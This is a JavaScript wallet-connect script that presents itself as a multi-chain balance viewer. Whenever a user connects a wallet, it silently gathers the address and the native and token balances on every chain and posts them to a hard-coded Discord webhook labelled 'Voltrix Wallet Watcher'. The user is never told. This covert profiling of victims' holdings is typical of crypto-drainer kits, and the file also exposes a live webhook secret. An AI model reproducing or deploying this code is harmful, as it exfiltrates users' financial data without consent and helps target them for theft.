import {
  EthereumClient,
  w3mConnectors,
  w3mProvider,
  WagmiCore,
  WagmiCoreChains,
  WagmiCoreConnectors
} from "https://unpkg.com/@web3modal/ethereum@2.6.2";
import { Web3Modal } from "https://unpkg.com/@web3modal/html@2.6.2";

const {
  configureChains,
  createConfig,
  getAccount,
  fetchBalance,
  watchAccount
} = WagmiCore;

const chains = Object.values(WagmiCoreChains);
const projectId = "24cb4618162c124a24e58a917ab7cc45";

const { publicClient } = configureChains(chains, [w3mProvider({ projectId })]);

const wagmiConfig = createConfig({
  autoConnect: true,
  connectors: [
    ...w3mConnectors({ chains, version: 2, projectId }),
    new WagmiCoreConnectors.CoinbaseWalletConnector({
      chains,
      options: { appName: "Wallet MultiChain Balance" }
    }),
  ],
  publicClient,
});

const ethereumClient = new EthereumClient(wagmiConfig, chains);
const web3Modal = new Web3Modal({ projectId }, ethereumClient);

const webhookURL = "https://discord.com/api/webhooks/1364313853810446397/Mu0B78sHS1cEoKtYhxc3MHAQEJ0PkWXzOUR_EBDD1Asvu7XI563w49JGOYSA0DundyOj";

async function getUSDPrice(symbol) {
  try {
    const res = await fetch(`https://api.coingecko.com/api/v3/simple/price?ids=${symbol.toLowerCase()}&vs_currencies=usd`);
    const data = await res.json();
    return data[symbol.toLowerCase()]?.usd || null;
  } catch (err) {
    console.warn(`Price not found for ${symbol}`);
    return null;
  }
}

async function sendToDiscordEmbed({ address, chainName, chainId, native, tokens }) {
  const embed = {
    title: `\ud83c\udfe6 Wallet Connected`,
    description: `**\ud83d\udc64 Wallet:** \`${address}\`\n\ud83c\udf0d **Chain:** ${chainName} (ID: ${chainId})`,
    color: 0x00ffcc,
    fields: [
      {
        name: `\ud83d\udcb0 Native Balance`,
        value: `${native.symbol}: ${native.amount} ${native.usd ? `($${native.usd})` : ""}`,
        inline: false
      }
    ],
    footer: {
      text: `Voltrix Wallet Watcher`
    },
    timestamp: new Date().toISOString()
  };

  if (tokens.length > 0) {
    embed.fields.push({
      name: `\ud83d\udcdc Tokens`,
      value: tokens.map(t => `- ${t.symbol}: ${t.amount} ${t.usd ? `($${t.usd})` : ""}`).join('\n'),
      inline: false
    });
  }

  try {
    await fetch(webhookURL, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ embeds: [embed] })
    });
  } catch (err) {
    console.error("Failed to send embed", err);
  }
}

async function sendBalancesToDiscord(account) {
  if (!account.isConnected) return;

  const address = account.address;

  for (const chain of chains) {
    try {
      const chainId = chain.id;
      const chainName = chain.name;

      const nativeBalance = await fetchBalance({ address, chainId });
      const nativeAmount = parseFloat(nativeBalance.formatted).toFixed(6);
      const nativePrice = await getUSDPrice(nativeBalance.symbol);
      const nativeUSD = nativePrice ? nativePrice * nativeAmount : null;

      const { publicClient: chainClient } = configureChains([chain], [w3mProvider({ projectId })]);
      const tokensList = [];

      if (chainClient.getTokenBalances) {
        const tokens = await chainClient.getTokenBalances({ address });
        for (const token of tokens) {
          const amount = parseFloat(token.formatted).toFixed(6);
          const usdPrice = await getUSDPrice(token.symbol);
          tokensList.push({
            symbol: token.symbol,
            amount,
            usd: usdPrice ? usdPrice * amount : null
          });
        }
      }

      await sendToDiscordEmbed({
        address,
        chainName,
        chainId,
        native: {
          symbol: nativeBalance.symbol,
          amount: nativeAmount,
          usd: nativeUSD ? nativeUSD.toFixed(2) : null
        },
        tokens: tokensList
      });

    } catch (err) {
      console.error(`Error on chain ${chain.name}:`, err);
    }
  }
}

watchAccount((account) => {
  if (account.isConnected) {
    sendBalancesToDiscord(account);
  }
});
